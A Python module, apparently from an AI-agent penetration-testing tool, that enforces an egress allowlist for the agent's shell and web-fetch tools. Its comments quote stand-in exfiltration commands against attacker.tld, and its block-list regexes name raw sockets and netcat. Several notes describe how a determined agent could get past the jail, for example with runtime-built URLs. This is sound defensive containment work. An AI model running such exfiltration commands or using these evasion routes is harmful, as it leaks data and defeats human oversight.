"""Egress allowlisting — the safe-harbor floor for ALL live contact (spec §9, §17).

The one hard rule for live dynamic testing: an outbound request may reach ONLY a host the
operator authorized as in-scope (plus loopback, for the local OOB listener / a locally-stood-up
app, and a small set of package registries needed to BUILD a harness). Every other host is
denied — this is what keeps authorized testing from ever touching a third party's system or a
production service.

Everything here is a PURE function (no I/O, no sockets), so it is exhaustively unit-testable and
can be reused by three call sites with one definition of "allowed": the ScopeGuard egress gate,
the in-process HTTP tool (``tools.http_sandbox``), and the agent's bash network jail
(``agents.claude_session.bash_safety``).
"""

from __future__ import annotations

import re
import shlex
from urllib.parse import urlparse

# Package registries / source mirrors a harness legitimately needs to build itself (pip, npm,
# cargo, go, system fetch). Allowed for fetches even under the egress jail because they are not a
# target and reaching them cannot touch a third party's *system under test*. Kept deliberately
# small; never includes a generic paste/exfil sink beyond these well-known build endpoints.
_BUILD_HOSTS: frozenset[str] = frozenset({
    "pypi.org", "files.pythonhosted.org",
    "registry.npmjs.org", "registry.yarnpkg.com",
    "crates.io", "static.crates.io",
    "proxy.golang.org", "sum.golang.org", "goproxy.io",
    "github.com", "raw.githubusercontent.com", "codeload.github.com", "objects.githubusercontent.com",
})

_LOOPBACK: frozenset[str] = frozenset({"127.0.0.1", "::1", "localhost", "0.0.0.0"})

# OFFICIAL installer / OS-mirror endpoints a PROVISIONING command may reach on top of
# ``_BUILD_HOSTS`` and the engagement allowlist. An install command is NO LONGER exempt from the
# egress jail (it used to short-circuit it entirely, which made any command containing an install
# token a free egress channel); it is instead evaluated against allowlist ∪ build ∪ install hosts.
# Every entry is a first-party distribution endpoint for a toolchain a harness genuinely needs —
# never a generic paste/exfil sink. Keep it small and justified.
_INSTALL_HOSTS: frozenset[str] = frozenset({
    # language / tool installers
    "foundry.paradigm.xyz", "sh.rustup.rs", "static.rust-lang.org", "astral.sh",
    "install.python-poetry.org", "get.pnpm.io", "bun.sh", "deno.land", "nodejs.org",
    "deb.nodesource.com", "go.dev", "golang.org", "dl.google.com",
    # OS package mirrors
    "deb.debian.org", "security.debian.org", "archive.ubuntu.com", "security.ubuntu.com",
    "ports.ubuntu.com", "dl-cdn.alpinelinux.org", "packages.microsoft.com",
    "repo.almalinux.org", "mirror.stream.centos.org", "download.fedoraproject.org",
    # language registries not already in _BUILD_HOSTS
    "rubygems.org", "api.rubygems.org", "repo1.maven.org", "repo.maven.apache.org",
    "repo.anaconda.com", "conda.anaconda.org", "formulae.brew.sh", "ghcr.io",
})

# Hosts the RESEARCH tools (WebFetch) may read: CVE/advisory databases, standards bodies and
# first-party language/framework documentation. Research is explicitly allowlisted rather than
# banned, so an agent can still read an advisory, but it can no longer fetch an arbitrary URL
# (which was a plain exfil channel: ``WebFetch https://attacker.tld/?leak=...``).
_RESEARCH_HOSTS: frozenset[str] = frozenset({
    # vulnerability / advisory data
    "nvd.nist.gov", "cve.org", "cve.mitre.org", "cwe.mitre.org", "capec.mitre.org",
    "attack.mitre.org", "osv.dev", "api.osv.dev", "security.snyk.io", "rustsec.org",
    "github.com", "raw.githubusercontent.com", "gist.github.com", "advisories.gitlab.com",
    "www.exploit-db.com", "exploit-db.com", "packetstormsecurity.com", "seclists.org",
    "huntr.com", "hackerone.com", "bugcrowd.com", "immunefi.com", "code4rena.com",
    "blog.openzeppelin.com", "swcregistry.io", "consensys.github.io",
    # standards / technique references
    "owasp.org", "cheatsheetseries.owasp.org", "portswigger.net", "www.rfc-editor.org",
    "rfc-editor.org", "datatracker.ietf.org", "developer.mozilla.org",
    # first-party docs for common target stacks
    "docs.python.org", "docs.soliditylang.org", "doc.rust-lang.org", "pkg.go.dev",
    "nodejs.org", "docs.djangoproject.com", "spring.io", "docs.oracle.com",
    "learn.microsoft.com", "kubernetes.io", "docs.docker.com",
})

# A URL in ANY scheme embedded anywhere in a shell command. Matching only ``https?://`` left
# every other scheme (ftp://, ssh://, gopher://, smb://, s3://, ws://) as a free egress channel.
_URL_RE = re.compile(r"\b[a-z][a-z0-9+.\-]{0,15}://[^\s'\"`)>|&;]+", re.IGNORECASE)

# --- bare-host extraction for network CLIs -----------------------------------------------------
# Command position: start of input, or after a pipe/semicolon/&&/newline/subshell. Anchoring here
# (rather than a bare \b) keeps generic words like ``host`` from matching an argument such as
# ``grep -rn host .`` while still catching ``X=$(host attacker.tld)``.
_CMD_POS = r"(?:^|[|;&\n(`{]|\$\()\s*(?:(?:sudo|doas|time|nohup|exec|env|command|builtin)\s+)*" \
           r"(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*"
# Tools that take a bare host / user@host / host:port argument. http(s) URLs are handled by
# _URL_RE above; this closes the "no scheme" half (``ssh u@h``, ``dig x.h``, ``curl h/p``).
_HOST_ARG_TOOLS = (
    "nc", "ncat", "netcat", "telnet", "ssh", "scp", "sftp", "rsync", "ftp", "lftp", "tftp",
    "curl", "wget", "aria2c", "httpie", "http", "dig", "nslookup", "host", "drill",
    "ping", "ping6", "traceroute", "traceroute6", "mtr", "openssl", "mysql", "psql",
    "mongo", "mongosh", "redis-cli", "smbclient", "ldapsearch", "snmpwalk",
)
_HOST_CMD_RE = re.compile(
    _CMD_POS + r"(?P<cmd>" + "|".join(sorted(_HOST_ARG_TOOLS, key=len, reverse=True)) + r")"
    r"(?![\w./-])(?P<args>[^|;&\n]*)", re.IGNORECASE)
# git/go only contact a remote for specific subcommands — scanning every ``git``/``go`` invocation
# would flag purely local work (``git log``, ``go test``).
_GIT_REMOTE_RE = re.compile(
    _CMD_POS + r"git(?:\s+-\S+|\s+--\S+)*\s+"
    r"(?:clone|fetch|pull|push|remote|ls-remote|submodule|archive)(?![\w-])(?P<args>[^|;&\n]*)",
    re.IGNORECASE)
_GO_FETCH_RE = re.compile(
    _CMD_POS + r"go\s+(?:get|install|mod\s+download)(?![\w-])(?P<args>[^|;&\n]*)", re.IGNORECASE)

# Flags whose VALUE is payload/credentials/config, never a destination host. Skipping them keeps
# legitimate testing working (e.g. a Host-header test: ``curl -H 'Host: internal' https://in.scope``).
# CASE MATTERS here: curl's ``-H`` is a header (payload) while psql/mysql's ``-h`` is the host
# (a destination we DO want to extract), so these are compared case-sensitively.
_VALUE_FLAGS = frozenset({
    "-H", "--header", "-A", "--user-agent", "-e", "--referer",
    "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode",
    "-F", "--form", "--form-string", "-u", "--user", "-b", "--cookie", "-c", "--cookie-jar",
    "-o", "--output", "-T", "--upload-file", "-w", "--write-out", "-X", "--request",
    "--cert", "--key", "--cacert", "--identity",
    "-p", "-P", "--port", "-l", "--password", "--username", "-m", "--max-time",
})
# Final labels that mean "this token is a FILE, not a host" (``scp loot.txt u@h:/tmp`` must not
# report ``loot.txt`` as a contacted host).
_FILE_EXTS = frozenset({
    "txt", "md", "rst", "json", "yaml", "yml", "toml", "lock", "log", "csv", "tsv", "xml",
    "html", "htm", "js", "mjs", "cjs", "ts", "tsx", "jsx", "py", "pyc", "pyi", "rb", "go",
    "rs", "sol", "c", "h", "cc", "cpp", "hpp", "java", "kt", "kts", "swift", "sh", "bash",
    "zsh", "fish", "env", "cfg", "conf", "ini", "properties", "pem", "key", "crt", "cer",
    "sql", "db", "sqlite", "zip", "tar", "gz", "tgz", "bz2", "xz", "zst", "whl", "jar",
    "so", "dylib", "dll", "exe", "bin", "o", "a", "out", "png", "jpg", "jpeg", "gif", "svg",
    "pdf", "class", "php", "pl", "lua", "vim", "service", "patch", "diff", "sum", "mod",
    "bak", "tmp", "example", "sample", "template", "t", "snap", "map", "min", "css", "scss",
})

# --- command shapes that defeat host extraction (best-effort, defense-in-depth) ----------------
# NOTE: this is a BLOCKLIST, and a blocklist is never airtight — a determined agent can still
# build a destination at runtime (``curl "$URL"``, a URL assembled inside a PoC script we never
# see). It exists to close the cheap, obvious holes; hard containment needs a container/VM with a
# real network policy. Each pattern below denies a shape whose destination we cannot inspect.
_DEV_SOCKET_RE = re.compile(r"/dev/(?:tcp|udp)(?:/|\b)", re.IGNORECASE)
_CURL_CONFIG_RE = re.compile(
    _CMD_POS + r"curl(?![\w./-])[^|;&\n]*\s(?:-K|--config)(?![\w-])", re.IGNORECASE)
_WGET_INPUT_RE = re.compile(
    _CMD_POS + r"wget(?![\w./-])[^|;&\n]*\s(?:-i|--input-file)(?![\w-])", re.IGNORECASE)
_XARGS_FETCH_RE = re.compile(
    r"\bxargs\b[^|;&\n]*\b(?:curl|wget|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|aria2c|ftp"
    r"|dig|nslookup|host|openssl)(?![\w./-])", re.IGNORECASE)
_INLINE_INTERP_RE = re.compile(
    _CMD_POS + r"(?:python3?|python3\.\d+|perl|ruby|node|php|deno|bun|lua)(?![\w./-])"
    r"[^|;&\n]*\s-(?:c|e|E)(?![\w-])", re.IGNORECASE)
_NET_PRIMITIVE_RE = re.compile(
    r"socket|create_connection|urlopen|urllib|requests\.|httpx|http\.client|HTTPConnection"
    r"|telnetlib|ftplib|smtplib|paramiko|Net::HTTP|LWP|file_get_contents|curl_exec|open-uri"
    r"|fetch\s*\(|net\.connect|https?\.get|XMLHttpRequest|axios|urllib2|getaddrinfo",
    re.IGNORECASE)


def normalize_host(url_or_host: str) -> str:
    """Lowercased hostname with any port/userinfo/brackets stripped. Accepts a full URL, a
    ``host:port``, or a bare host. Returns "" when nothing host-like is present."""
    if not url_or_host:
        return ""
    s = str(url_or_host).strip()
    if "://" in s:
        s = urlparse(s).hostname or ""
    else:
        # strip any path, then userinfo, then port; tolerate IPv6 brackets.
        s = s.split("/")[0]
        if "@" in s:
            s = s.rsplit("@", 1)[1]
        if s.startswith("["):  # [::1]:8080
            s = s[1: s.find("]")] if "]" in s else s[1:]
        elif s.count(":") == 1:  # host:port (a lone colon → port; many colons → IPv6, leave it)
            s = s.split(":")[0]
    return s.strip().lower().rstrip(".")


def is_loopback(host: str) -> bool:
    h = normalize_host(host)
    return h in _LOOPBACK or h.endswith(".localhost")


def host_in_allowlist(host: str, allowlist: list[str] | frozenset[str]) -> bool:
    """A host matches if it equals an allowlist entry or is a subdomain of one. Allowlist entries
    are themselves normalized to hostnames, so callers may pass raw URLs/values from the scope."""
    h = normalize_host(host)
    if not h:
        return False
    for raw in allowlist:
        entry = normalize_host(raw)
        if not entry:
            continue
        if h == entry or h.endswith("." + entry):
            return True
    return False


def url_allowed(
    url: str,
    allowlist: list[str] | frozenset[str],
    *,
    allow_loopback: bool = True,
    allow_build_hosts: bool = True,
) -> tuple[bool, str]:
    """Decide whether a single URL/host may be contacted. Returns ``(ok, reason)``.

    Order: loopback (local OOB/app) → in-scope allowlist → build-host carve-out → deny. The
    default ``allow_loopback`` lets harnesses talk to the local OOB listener and a locally
    stood-up instance; pass False to forbid even that (e.g. a pure remote-only policy)."""
    host = normalize_host(url)
    if not host:
        return False, "no host in target"
    if allow_loopback and is_loopback(host):
        return True, "loopback (local)"
    if host_in_allowlist(host, allowlist):
        return True, f"in scope ({host})"
    if allow_build_hosts and host in _BUILD_HOSTS:
        return True, f"build/registry host ({host})"
    return False, f"out of scope: {host} is not in the authorized egress allowlist — denied"


def research_url_allowed(url: str, allowlist: list[str] | frozenset[str]) -> tuple[bool, str]:
    """Decide whether a RESEARCH fetch (WebFetch) may read ``url``: the engagement allowlist plus
    the explicit ``_RESEARCH_HOSTS`` set (CVE/advisory/standards/first-party docs). Research is
    allowlisted, not banned — but an arbitrary URL is no longer a legal research target."""
    ok, why = url_allowed(url, allowlist)
    if ok:
        return True, why
    host = normalize_host(url)
    if host and (host in _RESEARCH_HOSTS or host_in_allowlist(host, _RESEARCH_HOSTS)):
        return True, f"research host ({host})"
    if not host:
        return False, "no host in research url"
    return False, (f"out of scope: {host} is not an authorized in-scope or research host — "
                   "denied (research is limited to the CVE/advisory/doc allowlist)")


def _host_like(token: str) -> str:
    """Normalized host for a bare command ARGUMENT, or "" when the token is not a destination.

    Deliberately conservative so local work is never mistaken for egress: a token must be an
    IPv4/IPv6 literal, loopback, or a dotted name whose last label looks like a TLD (alphabetic,
    not a common file extension). Tokens carrying ``$``/`` ` `` are kept — a computed host must
    still be checked (and will fail the allowlist), which is how DNS exfil gets denied."""
    t = token.strip().strip("'\"").rstrip(")`,;>}\"'")
    if not t or t.startswith(("-", "/", "~", ".", "@", "=")) or "=" in t.split(":")[0]:
        return ""
    if "::" in t and "://" not in t and not t.startswith("["):
        t = t.split("::", 1)[0]  # rsync host::module
    h = normalize_host(t)
    if not h or " " in h or "/" in h or "*" in h:
        return ""
    if h in _LOOPBACK or h.endswith(".localhost"):
        return h
    if ":" in h:  # IPv6 literal
        return h
    labels = h.split(".")
    if len(labels) == 4 and all(lbl.isdigit() and 0 <= int(lbl) <= 255 for lbl in labels):
        return h  # IPv4
    if len(labels) < 2:
        return ""
    tld = labels[-1]
    if not tld.isalpha() or len(tld) < 2 or tld in _FILE_EXTS:
        return ""
    return h


def _args_hosts(args: str) -> list[str]:
    """Hosts named by the ARGUMENTS of one network command (``ssh u@h``, ``dig x.h``, ``curl h/p``,
    ``rsync h::m``, ``go get h/pkg``). Quote-aware so a header/body value is one token."""
    try:
        tokens = shlex.split(args, posix=True)
    except ValueError:  # unbalanced quotes — fall back to whitespace tokens
        tokens = args.split()
    hosts: list[str] = []
    skip_next = False
    for raw in tokens:
        if skip_next:
            skip_next = False
            continue
        if raw in _VALUE_FLAGS:
            skip_next = True
            continue
        if raw.startswith("-"):
            continue
        h = _host_like(raw)
        if h and h not in hosts:
            hosts.append(h)
    return hosts


def extract_hosts(command: str) -> list[str]:
    """Every host a shell command would CONTACT: from URLs in ANY scheme, and from the bare
    host/user@host/host:port arguments of the network CLIs (ssh/scp/sftp/rsync/dig/nslookup/host/
    ftp/aria2c/curl/wget/nc/…, plus remote ``git`` and ``go get``). Order-preserving, de-duplicated.
    Used by the bash network jail to vet outbound calls.

    Best-effort by construction: a destination computed at runtime (``curl "$URL"``) carries no
    host to extract — ``bash_egress_ok`` denies the obvious shapes of that, but see its note."""
    if not command:
        return []
    hosts: list[str] = []
    seen: set[str] = set()

    def _add(value: str) -> None:
        if value and value not in seen:
            seen.add(value)
            hosts.append(value)

    for m in _URL_RE.finditer(command):
        _add(normalize_host(m.group(0)))
    for rx in (_HOST_CMD_RE, _GIT_REMOTE_RE, _GO_FETCH_RE):
        for m in rx.finditer(command):
            for h in _args_hosts(m.group("args") or ""):
                _add(h)
    return hosts


def uninspectable_egress(command: str) -> tuple[bool, str]:
    """Deny COMMAND SHAPES whose destination cannot be inspected, so they cannot be used to walk
    around host extraction: ``/dev/tcp`` sockets, ``curl -K`` / ``wget -i`` (URLs read from a
    file), an ``xargs``-piped fetcher, and an inline interpreter (``python -c``) that opens a
    network connection without a literal URL we can check.

    Returns ``(denied, reason)``. This is defense-in-depth, NOT a complete control: a blocklist
    cannot enumerate every way to build a destination at runtime. Hard containment requires a
    sandbox with a real egress policy; this closes the cheap holes and makes the rest loud."""
    if not command:
        return False, ""
    if _DEV_SOCKET_RE.search(command):
        return True, "out of scope: /dev/tcp|/dev/udp raw socket (uninspectable egress) — denied"
    if _CURL_CONFIG_RE.search(command):
        return True, "out of scope: curl -K/--config reads URLs from a file (uninspectable egress) — denied"
    if _WGET_INPUT_RE.search(command):
        return True, "out of scope: wget -i/--input-file reads URLs from a file (uninspectable egress) — denied"
    if _XARGS_FETCH_RE.search(command):
        return True, "out of scope: xargs-piped fetcher (uninspectable egress) — denied"
    if _INLINE_INTERP_RE.search(command) and _NET_PRIMITIVE_RE.search(command) \
            and not extract_hosts(command):
        return True, ("out of scope: inline interpreter opens a network connection with no literal "
                      "URL to check (uninspectable egress) — denied; use a literal in-scope URL")
    return False, ""


def bash_egress_ok(command: str, allowlist: list[str] | frozenset[str]) -> tuple[bool, str]:
    """The bash network jail: deny the command if ANY host it would contact is not authorized, or
    if its SHAPE hides the destination (see ``uninspectable_egress``). A command with no outbound
    host is allowed (local work).

    This is ALWAYS enforced by the callers now. An empty allowlist is the unarmed/most-restrictive
    case — ``url_allowed`` then permits only loopback and the build/registry carve-out — so a
    dry-run or a mis-wired caller cannot reach a remote host (it previously skipped the jail
    entirely, which left dry-run free to contact anything)."""
    denied, why = uninspectable_egress(command)
    if denied:
        return False, why
    for host in extract_hosts(command):
        ok, reason = url_allowed(host, allowlist)
        if not ok:
            return False, reason
    return True, "egress in scope"


def install_egress_ok(command: str, allowlist: list[str] | frozenset[str]) -> tuple[bool, str]:
    """The jail for a PROVISIONING command: the engagement allowlist ∪ ``_BUILD_HOSTS`` ∪
    ``_INSTALL_HOSTS``. Installs used to bypass the egress jail outright, so any command carrying
    an install token (``pip install x && curl https://attacker.tld/?d=$(cat loot)``) was free to
    reach any host. They are now host-checked like everything else — just against the wider set
    that real package registries and official installer scripts need."""
    return bash_egress_ok(command, [*allowlist, *_INSTALL_HOSTS])
